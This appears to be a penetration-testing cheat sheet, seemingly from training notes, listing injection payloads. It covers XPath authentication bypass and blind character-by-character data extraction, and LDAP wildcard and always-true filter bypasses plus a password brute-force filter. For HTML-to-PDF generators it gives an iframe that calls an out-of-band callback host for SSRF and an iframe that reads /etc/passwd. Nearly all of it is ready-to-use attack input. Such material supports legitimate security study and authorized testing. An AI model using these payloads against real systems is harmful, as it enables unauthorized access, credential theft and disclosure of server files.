#web #xpath #ldap #ssrf #pdf

# Injection Attacks (XPath / LDAP / PDF-Gen)

Related: [sqli](sqli.md) · [nosqli](nosqli.md) · [command-injection](command-injection.md) · [server-side-attacks](server-side-attacks.md) · [enumeration](../AD/enumeration.md)

## Contents
- [XPath Injection — Auth Bypass](#xpath-injection--auth-bypass)
- [XPath — Data Exfiltration](#xpath--data-exfiltration)
- [LDAP Injection — Auth Bypass](#ldap-injection--auth-bypass)
- [LDAP — Data Exfiltration](#ldap--data-exfiltration)
- [PDF Generation Vulnerabilities](#pdf-generation-vulnerabilities)

## XPath Injection — Auth Bypass
```text
admin' or '1'='1
```
Bypass XPath auth with a known username.

```text
' or position()=1 or '
```
Bypass by node position.

```text
' or contains(.,'admin') or '
```
Bypass by substring match.

## XPath — Data Exfiltration
```text
| //text()
```
Union-leak the entire XML document (unrestricted).

```text
invalid' or substring(name(/*[1]),1,1)='a' and '1'='1
```
Blind: exfil a node name character-by-character.

```text
invalid' or substring(/users/user[1]/username,1,1)='a' and '1'='1
```
Blind: exfil a value character-by-character.

```text
invalid' or substring(/users/user[1]/username,1,1)='a' and count((//.)[count((//.))]) and '1'='1
```
Time-based blind exfiltration (forces exponential processing).

## LDAP Injection — Auth Bypass
```text
(&(uid=*)(userPassword=*))
```
Wildcard bypass (username `*`, password `*`).

```text
(&(uid=admin*)(userPassword=*))
```
Wildcard bypass targeting a specific user.

```text
(&(uid=admin)(|(&)(userPassword=invalid)))
```
Universal-true bypass (username `admin)(|(&)`, password `invalid)`).

## LDAP — Data Exfiltration
```text
(&(uid=htb-stdnt)(userPassword=p@ssw*))
```
Brute-force a password char-by-char via the wildcard. See [password-attacks](../Passwords/password-attacks.md).

## PDF Generation Vulnerabilities
```bash
exiftool invoice.pdf
```
Identify the PDF library (e.g. `wkhtmltopdf`) — guides the HTML-injection exploit.

```html
<iframe src="http://<collab>.oast.fun/ssrftest"></iframe>
```
SSRF via HTML rendered into a PDF. See [server-side-attacks](server-side-attacks.md).

```html
<iframe src="file:///etc/passwd" width="800" height="500"></iframe>
```
LFI via HTML-to-PDF (also `<object data>`, `<portal src>`, `<annotation file=>`, or XHR to `file://`).
